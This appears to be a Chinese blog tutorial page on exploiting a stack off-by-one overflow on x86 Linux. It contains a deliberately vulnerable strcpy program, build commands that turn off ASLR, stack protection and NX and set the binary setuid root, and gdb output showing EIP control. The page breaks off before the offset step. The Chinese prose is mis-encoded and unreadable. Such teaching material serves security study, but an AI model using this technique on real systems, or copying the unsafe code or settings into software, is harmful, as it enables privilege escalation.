<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>æ ˆå†…off-by-oneæ¼æ´åˆ©ç”¨ - å–„å®ˆè€…</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="ä½œè€…: CSysSecå‡ºå“  CSysSecæ³¨ï¼š æœ¬ç³»åˆ—æ–‡ç« è¯‘è‡ªå®‰å…¨è‡ªç”±å·¥ä½œè€…Sploitfunçš„æ¼æ´åˆ©ç”¨ç³»åˆ—åšå®¢ï¼Œä»ç»å…¸æ ˆç¼“å†²åŒºæ¼æ´åˆ©ç”¨å †æ¼æ´åˆ©ç”¨ï¼Œå¾ªåºæ¸è¿›ï¼Œæ˜¯åˆå­¦è€…ä¸å¯å¤šå¾—çš„å¥½ææ–™ï¼Œæœ¬ç³»åˆ—æ‰€æœ‰æ–‡ç« æ¶‰åŠçš„æºç å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ã€‚CSysSecè®¡åˆ’åœ¨åŸåŸºç¡€ä¸Šä¸æ–­æ·»åŠ ç›¸å…³æ¼æ´åˆ©ç”¨æŠ€æœ¯ä»¥åŠç›¸åº”çš„Mitigationæ–¹æ³•ï¼Œæ¬¢è¿æ¨èæˆ–è‡ªèæ–‡ç« ã€‚è½¬è½½æœ¬æ–‡è¯·åŠ¡å¿…æ³¨æ˜ï¼Œæ–‡ç« å‡ºå¤„ï¼šã€ŠLinux(X86)æ¼æ´åˆ©ç”¨ç³»åˆ—-">
<meta name="keywords" content="Exploit,Security,Stack">
<meta property="og:type" content="article">
<meta property="og:title" content="æ ˆå†…off-by-oneæ¼æ´åˆ©ç”¨">
<meta property="og:url" content="https://diting0x.github.io/20161231/stackoffbyone/index.html">
<meta property="og:site_name" content="å–„å®ˆè€…">
<meta property="og:description" content="ä½œè€…: CSysSecå‡ºå“  CSysSecæ³¨ï¼š æœ¬ç³»åˆ—æ–‡ç« è¯‘è‡ªå®‰å…¨è‡ªç”±å·¥ä½œè€…Sploitfunçš„æ¼æ´åˆ©ç”¨ç³»åˆ—åšå®¢ï¼Œä»ç»å…¸æ ˆç¼“å†²åŒºæ¼æ´åˆ©ç”¨å †æ¼æ´åˆ©ç”¨ï¼Œå¾ªåºæ¸è¿›ï¼Œæ˜¯åˆå­¦è€…ä¸å¯å¤šå¾—çš„å¥½ææ–™ï¼Œæœ¬ç³»åˆ—æ‰€æœ‰æ–‡ç« æ¶‰åŠçš„æºç å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ã€‚CSysSecè®¡åˆ’åœ¨åŸåŸºç¡€ä¸Šä¸æ–­æ·»åŠ ç›¸å…³æ¼æ´åˆ©ç”¨æŠ€æœ¯ä»¥åŠç›¸åº”çš„Mitigationæ–¹æ³•ï¼Œæ¬¢è¿æ¨èæˆ–è‡ªèæ–‡ç« ã€‚è½¬è½½æœ¬æ–‡è¯·åŠ¡å¿…æ³¨æ˜ï¼Œæ–‡ç« å‡ºå¤„ï¼šã€ŠLinux(X86)æ¼æ´åˆ©ç”¨ç³»åˆ—-">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://oij0laovn.bkt.clouddn.com/stackoffbyone1.png">
<meta property="og:updated_time" content="2017-08-28T07:15:24.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="æ ˆå†…off-by-oneæ¼æ´åˆ©ç”¨">
<meta name="twitter:description" content="ä½œè€…: CSysSecå‡ºå“  CSysSecæ³¨ï¼š æœ¬ç³»åˆ—æ–‡ç« è¯‘è‡ªå®‰å…¨è‡ªç”±å·¥ä½œè€…Sploitfunçš„æ¼æ´åˆ©ç”¨ç³»åˆ—åšå®¢ï¼Œä»ç»å…¸æ ˆç¼“å†²åŒºæ¼æ´åˆ©ç”¨å †æ¼æ´åˆ©ç”¨ï¼Œå¾ªåºæ¸è¿›ï¼Œæ˜¯åˆå­¦è€…ä¸å¯å¤šå¾—çš„å¥½ææ–™ï¼Œæœ¬ç³»åˆ—æ‰€æœ‰æ–‡ç« æ¶‰åŠçš„æºç å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ã€‚CSysSecè®¡åˆ’åœ¨åŸåŸºç¡€ä¸Šä¸æ–­æ·»åŠ ç›¸å…³æ¼æ´åˆ©ç”¨æŠ€æœ¯ä»¥åŠç›¸åº”çš„Mitigationæ–¹æ³•ï¼Œæ¬¢è¿æ¨èæˆ–è‡ªèæ–‡ç« ã€‚è½¬è½½æœ¬æ–‡è¯·åŠ¡å¿…æ³¨æ˜ï¼Œæ–‡ç« å‡ºå¤„ï¼šã€ŠLinux(X86)æ¼æ´åˆ©ç”¨ç³»åˆ—-">
<meta name="twitter:image" content="http://oij0laovn.bkt.clouddn.com/stackoffbyone1.png">
  
  
  <link href="/webfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
  <link href="/webfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <header id="header">
  <div id="header-outer" class="outer">
    <div id="header-inner" class="inner">
      <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
      <a id="logo" class="logo logo-text" href="/">è°›å¬</a>
      <nav id="main-nav">
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
          <a class="main-nav-link" href="/timeline">Timeline</a>
        
          <a class="main-nav-link" href="/shoulders">Shoulders</a>
        
          <a class="main-nav-link" href="/about">About</a>
        
      </nav>
      <nav id="sub-nav">
        <div id="search-form-wrap">
          <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://diting0x.github.io"></form>
        </div>
      </nav>
    </div>
  </div>
</header>
    <section id="main" class="outer"><article id="post-stackoffbyone" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      æ ˆå†…off-by-oneæ¼æ´åˆ©ç”¨
    </h1>
  

      </header>
    
    <div class="article-meta">
      <a href="/20161231/stackoffbyone/" class="article-date">
  <time datetime="2016-12-31T06:38:26.000Z" itemprop="datePublished">2016-12-31</time>
</a>
      
  <div class="article-category">
    <a class="article-category-link" href="/categories/æ¼æ´åˆ©ç”¨/">æ¼æ´åˆ©ç”¨</a>
  </div>

      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>ä½œè€…: <a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSecå‡ºå“</a></p>
<hr>
<p><strong>CSysSecæ³¨</strong>ï¼š æœ¬ç³»åˆ—æ–‡ç« è¯‘è‡ªå®‰å…¨è‡ªç”±å·¥ä½œè€…<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>çš„æ¼æ´åˆ©ç”¨ç³»åˆ—åšå®¢ï¼Œä»ç»å…¸æ ˆç¼“å†²åŒºæ¼æ´åˆ©ç”¨å †æ¼æ´åˆ©ç”¨ï¼Œå¾ªåºæ¸è¿›ï¼Œæ˜¯åˆå­¦è€…ä¸å¯å¤šå¾—çš„å¥½ææ–™ï¼Œæœ¬ç³»åˆ—æ‰€æœ‰æ–‡ç« æ¶‰åŠçš„æºç å¯ä»¥åœ¨<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">è¿™é‡Œ</a>æ‰¾åˆ°ã€‚CSysSecè®¡åˆ’åœ¨åŸåŸºç¡€ä¸Šä¸æ–­æ·»åŠ ç›¸å…³æ¼æ´åˆ©ç”¨æŠ€æœ¯ä»¥åŠç›¸åº”çš„Mitigationæ–¹æ³•ï¼Œæ¬¢è¿æ¨èæˆ–è‡ªèæ–‡ç« ã€‚<br><strong>è½¬è½½æœ¬æ–‡è¯·åŠ¡å¿…æ³¨æ˜</strong>ï¼Œæ–‡ç« å‡ºå¤„ï¼šã€Š<a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">Linux(X86)æ¼æ´åˆ©ç”¨ç³»åˆ—-æ ˆå†…Off-by-oneæ¼æ´åˆ©ç”¨</a>ã€‹ä¸ä½œè€…ä¿¡æ¯ï¼š<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSecå‡ºå“</a></p>
<hr>
<blockquote>
<ul>
<li>0X01 ä»€ä¹ˆæ˜¯off-by-oneæ¼æ´</li>
<li>0X02 å¦‚ä½•å®ç°ä»»æ„ä»£ç æ‰§è¡Œ</li>
<li>0X03 å¦‚æœè°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºæ­£ä¸Šæ–¹ï¼Œè¯¥æ€ä¹ˆåŠ</li>
<li>0X04 ä»€ä¹ˆæƒ…å†µä¸‹è°ƒç”¨è€…çš„EBPä¸åœ¨ç›®æ ‡ç¼“å†²åŒºæ­£ä¸Šæ–¹</li>
</ul>
</blockquote>
<p><u><em>é˜…è¯»åŸºç¡€:</em></u></p>
<ol>
<li><a href="http://www.csyssec.org/20161231/stackbufferflow/" target="_blank" rel="external">ç»å…¸æ ˆç¼“å†²åŒºæº¢å‡º</a></li>
</ol>
<p><u><em>VM Setup:</em></u> Ubuntu 12.04 (x86)</p>
<h3 id="0X01-ä»€ä¹ˆæ˜¯off-by-oneæ¼æ´ï¼Ÿ"><a href="#0X01-ä»€ä¹ˆæ˜¯off-by-oneæ¼æ´ï¼Ÿ" class="headerlink" title="0X01 ä»€ä¹ˆæ˜¯off-by-oneæ¼æ´ï¼Ÿ"></a>0X01 ä»€ä¹ˆæ˜¯off-by-oneæ¼æ´ï¼Ÿ</h3><p>å°†æºç¼“å†²åŒºå¤åˆ¶åˆ°ç›®æ ‡ç¼“å†²åŒºæ—¶ï¼Œä»¥ä¸‹æƒ…å†µå¯èƒ½å¯¼è‡´Off-By-Oneæ¼æ´ï¼š</p>
<pre><code>æºå­—ç¬¦ä¸²é•¿åº¦ç­‰äºç›®æ ‡ç¼“å†²åŒºé•¿åº¦
</code></pre><p>å½“æºå­—ç¬¦ä¸²é•¿åº¦ç­‰äºç›®æ ‡ç¼“å†²åŒºé•¿åº¦æ—¶ï¼Œå•ä¸ªNULLå­—èŠ‚å°±ä¼šè¢«å¤åˆ¶åˆ°ç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œç”±äºç›®æ ‡ç¼“å†²åŒºå­˜å‚¨åœ¨æ ˆå†…ï¼Œå› æ­¤ï¼Œä»…å‡­å•ä¸ªNULLå­—èŠ‚å°±èƒ½æŠŠæ ˆå†…è°ƒç”¨è€…EBPçš„æœ€ä½æœ‰æ•ˆä½(LSB)è¦†ç›–æ‰ã€‚</p>
<p>ä¾ç…§æƒ¯ä¾‹ï¼Œæœªå…å®šä¹‰è¿‡äºæ¯ç‡¥ï¼Œä¸‹é¢æˆ‘ä»¬å°±æ¥çœ‹ä¸€åˆ™Off-By-Oneæ¼æ´ä»£ç ã€‚</p>
<p><u><em>æ¼æ´ä»£ç ï¼š</em></u></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line"> bar(arg); <span class="comment">/* [1] */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="built_in">strcpy</span>(buf, arg); <span class="comment">/* [2] */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">256</span>) &#123; <span class="comment">/* [3] */</span></div><div class="line">  <span class="built_in">printf</span>(<span class="string">"Attempted Buffer Overflow\n"</span>);</div><div class="line">  fflush(<span class="built_in">stdout</span>);</div><div class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line"> &#125;</div><div class="line"> foo(argv[<span class="number">1</span>]); <span class="comment">/* [4] */</span></div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><u><em>ç¼–è¯‘å‘½ä»¤ï¼š</em></u></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -fno-<span class="built_in">stack</span>-protector -z execstack -mpreferred-<span class="built_in">stack</span>-boundary=<span class="number">2</span> -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
<p>ä¸Šè¿°æ¼æ´ä»£ç çš„ç¬¬[2]è¡Œå°±æ˜¯Off-By-Oneæº¢å‡ºé—®é¢˜å¯èƒ½å‡ºç°çš„åœ°æ–¹ã€‚ç”±äºç›®æ ‡ç¼“å†²åŒºé•¿åº¦ä¸º256ï¼Œå› æ­¤256å­—èŠ‚çš„æºå­—ç¬¦ä¸²å°±å¯èƒ½å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p><strong>æ³¨ï¼šæœ¬ç³»åˆ—æ‰€æœ‰æ–‡ç« ä¸­ç¬¬[N]è¡Œä»£ç æŒ‡çš„çš„ä»£ç ä¸­æ˜¾ç¤º/*[N]*/çš„ä½ç½®ã€‚</strong></p>
<h3 id="0X02-å¦‚ä½•å®ç°ä»»æ„ä»£ç æ‰§è¡Œ"><a href="#0X02-å¦‚ä½•å®ç°ä»»æ„ä»£ç æ‰§è¡Œ" class="headerlink" title="0X02 å¦‚ä½•å®ç°ä»»æ„ä»£ç æ‰§è¡Œ"></a>0X02 å¦‚ä½•å®ç°ä»»æ„ä»£ç æ‰§è¡Œ</h3><p>ä»»æ„ä»£ç æ‰§è¡Œæ˜¯é€šè¿‡â€œEBP è¦†ç›–ï¼ˆEBP overwriteï¼‰â€æ–¹æ³•å®ç°çš„ã€‚å¦‚æœè°ƒç”¨è€…çš„EBPä½äºç›®æ ‡ç¼“å†²åŒºä¸Šæ–¹ï¼Œé‚£ä¹ˆæ‰§è¡Œstrcpyåï¼Œè°ƒç”¨è€…çš„EBPçš„LSBå¾ˆå¯èƒ½å·²ç„¶è¢«å•ä¸ªNULLå­—èŠ‚è¦†ç›–äº†ã€‚ä¸ºäº†è¿›ä¸€æ­¥äº†è§£off-by-oneï¼Œæˆ‘ä»¬æ¥åæ±‡ç¼–ä¸€åˆ™æ¼æ´ä»£ç å¹¶ä¸”ç”»å‡ºå®ƒçš„å †æ ˆå¸ƒå±€å§ã€‚</p>
<p><u><em>åæ±‡ç¼–ï¼š</em></u></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"> (gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="comment">//Function Prologue</span></div><div class="line"> <span class="number">0x08048497</span> &lt;+<span class="number">0</span>&gt;: push %ebp                    <span class="comment">//backup caller's ebp</span></div><div class="line"> <span class="number">0x08048498</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                <span class="comment">//set callee's (main) ebp to esp</span></div><div class="line"> <span class="number">0x0804849a</span> &lt;+<span class="number">3</span>&gt;: push %edi                    <span class="comment">//backup EDI</span></div><div class="line"> <span class="number">0x0804849b</span> &lt;+<span class="number">4</span>&gt;: sub $<span class="number">0x8</span>,%esp                <span class="comment">//create stack space</span></div><div class="line"> <span class="number">0x0804849e</span> &lt;+<span class="number">7</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax           <span class="comment">//eax = argv</span></div><div class="line"> <span class="number">0x080484a1</span> &lt;+<span class="number">10</span>&gt;: add $<span class="number">0x4</span>,%eax               <span class="comment">//eax = &amp;argv[1]</span></div><div class="line"> <span class="number">0x080484a4</span> &lt;+<span class="number">13</span>&gt;: mov (%eax),%eax             <span class="comment">//eax = argv[1]</span></div><div class="line"> <span class="number">0x080484a6</span> &lt;+<span class="number">15</span>&gt;: movl $<span class="number">0xffffffff</span>,<span class="number">-0x8</span>(%ebp) <span class="comment">//String Length Calculation -- Begins here</span></div><div class="line"> <span class="number">0x080484ad</span> &lt;+<span class="number">22</span>&gt;: mov %eax,%edx</div><div class="line"> <span class="number">0x080484af</span> &lt;+<span class="number">24</span>&gt;: mov $<span class="number">0x0</span>,%eax</div><div class="line"> <span class="number">0x080484b4</span> &lt;+<span class="number">29</span>&gt;: mov <span class="number">-0x8</span>(%ebp),%ecx</div><div class="line"> <span class="number">0x080484b7</span> &lt;+<span class="number">32</span>&gt;: mov %edx,%edi</div><div class="line"> <span class="number">0x080484b9</span> &lt;+<span class="number">34</span>&gt;: repnz scas %es:(%edi),%al</div><div class="line"> <span class="number">0x080484bb</span> &lt;+<span class="number">36</span>&gt;: mov %ecx,%eax</div><div class="line"> <span class="number">0x080484bd</span> &lt;+<span class="number">38</span>&gt;: <span class="keyword">not</span> %eax</div><div class="line"> <span class="number">0x080484bf</span> &lt;+<span class="number">40</span>&gt;: sub $<span class="number">0x1</span>,%eax               <span class="comment">//String Length Calculation -- Ends here</span></div><div class="line"> <span class="number">0x080484c2</span> &lt;+<span class="number">43</span>&gt;: cmp $<span class="number">0x100</span>,%eax             <span class="comment">//eax = strlen(argv[1]). if eax &gt; 256</span></div><div class="line"> <span class="number">0x080484c7</span> &lt;+<span class="number">48</span>&gt;: jbe <span class="number">0x80484e9</span> &lt;main+<span class="number">82</span>&gt;     <span class="comment">//Jmp if NOT greater</span></div><div class="line"> <span class="number">0x080484c9</span> &lt;+<span class="number">50</span>&gt;: movl $<span class="number">0x80485e0</span>,(%esp)      <span class="comment">//If greater print error string,flush and return.</span></div><div class="line"> <span class="number">0x080484d0</span> &lt;+<span class="number">57</span>&gt;: call <span class="number">0x8048380</span> &lt;<span class="built_in">puts</span>@plt&gt;   </div><div class="line"> <span class="number">0x080484d5</span> &lt;+<span class="number">62</span>&gt;: mov <span class="number">0x804a020</span>,%eax          </div><div class="line"> <span class="number">0x080484da</span> &lt;+<span class="number">67</span>&gt;: mov %eax,(%esp)             </div><div class="line"> <span class="number">0x080484dd</span> &lt;+<span class="number">70</span>&gt;: call <span class="number">0x8048360</span> &lt;fflush@plt&gt;</div><div class="line"> <span class="number">0x080484e2</span> &lt;+<span class="number">75</span>&gt;: mov $<span class="number">0x1</span>,%eax              </div><div class="line"> <span class="number">0x080484e7</span> &lt;+<span class="number">80</span>&gt;: jmp <span class="number">0x80484fe</span> &lt;main+<span class="number">103</span>&gt;</div><div class="line"> <span class="number">0x080484e9</span> &lt;+<span class="number">82</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax          <span class="comment">//argv[1] &lt;= 256, eax = argv</span></div><div class="line"> <span class="number">0x080484ec</span> &lt;+<span class="number">85</span>&gt;: add $<span class="number">0x4</span>,%eax               <span class="comment">//eax = &amp;argv[1]</span></div><div class="line"> <span class="number">0x080484ef</span> &lt;+<span class="number">88</span>&gt;: mov (%eax),%eax             <span class="comment">//eax = argv[1]</span></div><div class="line"> <span class="number">0x080484f1</span> &lt;+<span class="number">90</span>&gt;: mov %eax,(%esp)             <span class="comment">//foo arg</span></div><div class="line"> <span class="number">0x080484f4</span> &lt;+<span class="number">93</span>&gt;: call <span class="number">0x8048464</span>              <span class="comment">//call foo</span></div><div class="line"> <span class="number">0x080484f9</span> &lt;+<span class="number">98</span>&gt;: mov $<span class="number">0x0</span>,%eax               <span class="comment">//return value</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue</span></div><div class="line"> <span class="number">0x080484fe</span> &lt;+<span class="number">103</span>&gt;: add $<span class="number">0x8</span>,%esp              <span class="comment">//unwind stack space</span></div><div class="line"> <span class="number">0x08048501</span> &lt;+<span class="number">106</span>&gt;: pop %edi                   <span class="comment">//restore EDI</span></div><div class="line"> <span class="number">0x08048502</span> &lt;+<span class="number">107</span>&gt;: pop %ebp                   <span class="comment">//restore EBP</span></div><div class="line"> <span class="number">0x08048503</span> &lt;+<span class="number">108</span>&gt;: ret                        <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble foo</div><div class="line">Dump of assembler code <span class="keyword">for</span> function foo:</div><div class="line"> <span class="comment">//Function prologue</span></div><div class="line"> <span class="number">0x08048464</span> &lt;+<span class="number">0</span>&gt;: push %ebp                    <span class="comment">//backup caller's (main) ebp</span></div><div class="line"> <span class="number">0x08048465</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                <span class="comment">//set callee's (foo) ebp to esp</span></div><div class="line"> <span class="number">0x08048467</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x4</span>,%esp                <span class="comment">//create stack space</span></div><div class="line"> <span class="number">0x0804846a</span> &lt;+<span class="number">6</span>&gt;: mov <span class="number">0x8</span>(%ebp),%eax           <span class="comment">//foo arg</span></div><div class="line"> <span class="number">0x0804846d</span> &lt;+<span class="number">9</span>&gt;: mov %eax,(%esp)              <span class="comment">//bar arg = foo arg</span></div><div class="line"> <span class="number">0x08048470</span> &lt;+<span class="number">12</span>&gt;: call <span class="number">0x8048477</span>              <span class="comment">//call bar</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue </span></div><div class="line"> <span class="number">0x08048475</span> &lt;+<span class="number">17</span>&gt;: leave                       <span class="comment">//unwind stack space + restore ebp</span></div><div class="line"> <span class="number">0x08048476</span> &lt;+<span class="number">18</span>&gt;: ret                         <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble bar</div><div class="line">Dump of assembler code <span class="keyword">for</span> function bar:</div><div class="line"> <span class="comment">//Function Prologue</span></div><div class="line"> <span class="number">0x08048477</span> &lt;+<span class="number">0</span>&gt;: push %ebp                    <span class="comment">//backup caller's (foo) ebp</span></div><div class="line"> <span class="number">0x08048478</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                <span class="comment">//set callee's (bar) ebp to esp</span></div><div class="line"> <span class="number">0x0804847a</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x108</span>,%esp              <span class="comment">//create stack space</span></div><div class="line"> <span class="number">0x08048480</span> &lt;+<span class="number">9</span>&gt;: mov <span class="number">0x8</span>(%ebp),%eax           <span class="comment">//bar arg</span></div><div class="line"> <span class="number">0x08048483</span> &lt;+<span class="number">12</span>&gt;: mov %eax,<span class="number">0x4</span>(%esp)          <span class="comment">//strcpy arg2</span></div><div class="line"> <span class="number">0x08048487</span> &lt;+<span class="number">16</span>&gt;: lea <span class="number">-0x100</span>(%ebp),%eax       <span class="comment">//buf</span></div><div class="line"> <span class="number">0x0804848d</span> &lt;+<span class="number">22</span>&gt;: mov %eax,(%esp)             <span class="comment">//strcpy arg1</span></div><div class="line"> <span class="number">0x08048490</span> &lt;+<span class="number">25</span>&gt;: call <span class="number">0x8048370</span> &lt;<span class="built_in">strcpy</span>@plt&gt; <span class="comment">//call strcpy</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue</span></div><div class="line"> <span class="number">0x08048495</span> &lt;+<span class="number">30</span>&gt;: leave                       <span class="comment">//unwind stack space + restore ebp</span></div><div class="line"> <span class="number">0x08048496</span> &lt;+<span class="number">31</span>&gt;: ret                         <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p><u><em>å †æ ˆå¸ƒå±€ï¼š</em></u></p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/stackoffbyone1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/stackoffbyone1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>

<p>å‰é¢è®²åˆ°ï¼Œç”¨æˆ·è¾“å…¥äº†256å­—èŠ‚å¤§å°çš„æ•°æ®ï¼ŒNULLå­—èŠ‚å°±ä¼šè¦†ç›–fooçš„EBPçš„LSBã€‚æ‰€ä»¥å½“å­˜å‚¨äºç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™æ­£ä¸Šæ–¹çš„fooçš„EBPè¢«å•ä¸ªNULLå­—èŠ‚è¦†ç›–æ—¶ï¼ŒEBPå°±ä¼šç”±0xbffff2d8 å˜ä¸º0xbffff200ã€‚ç»†çœ‹å †æ ˆå¸ƒå±€å›¾ï¼Œæˆ‘ä»¬ä¼šå‘ç°æ ˆåœ°å€0xbffff200å°±æ˜¯ç›®æ ‡ç¼“å†²åŒºâ€˜bufâ€™çš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ—¢ç„¶ç”¨æˆ·è¾“å…¥å€¼å·²ç»è¢«å¤åˆ¶è¿›äº†è¿™ä¸ªç›®æ ‡ç¼“å†²åŒºï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±èƒ½å¾—åˆ°è¿™ä¸ªæ ˆåœ°å€(0xbffff200)çš„æ§åˆ¶æƒï¼ŒåŒæ—¶ä¹Ÿå¾—åˆ°äº†EIPçš„æ§åˆ¶æƒï¼Œä»è€Œå€Ÿæ­¤å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚æˆ‘ä»¬æ¥å‘é€ä¸€ä¸²å¤§å°ä¸º256å­—èŠ‚çš„â€œAâ€è¿›è¡Œæµ‹è¯•ã€‚</p>
<p>æµ‹è¯•ç¬¬ä¸€æ­¥ï¼šEBPè¦†ç›–åå‡ºç°è¿”å›åœ°å€è¦†ç›–æ˜¯å¦æœ‰å¯èƒ½ï¼Ÿ</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">(gdb) r `python -c 'print "A"*256'`</div><div class="line">Starting program: /home/sploitfun/lsploits/new/obo/stack/vuln `python -c 'print "A"*256'`</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line"><span class="number">0x41414141</span> in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$<span class="number">1</span> = <span class="number">0x41414141</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>ä¸Šè¿°è¾“å‡ºç»“æœæ˜¾ç¤ºï¼ŒEBPè¦†ç›–ä¼šè®©æˆ‘ä»¬å¾—åˆ°EIPçš„æ§åˆ¶æƒã€‚</p>
<p>æµ‹è¯•ç¬¬äºŒæ­¥ï¼šæ¥è‡ªç›®æ ‡ç¼“å†²åŒºçš„åç§»é‡æ˜¯ä»€ä¹ˆï¼Ÿ</p>
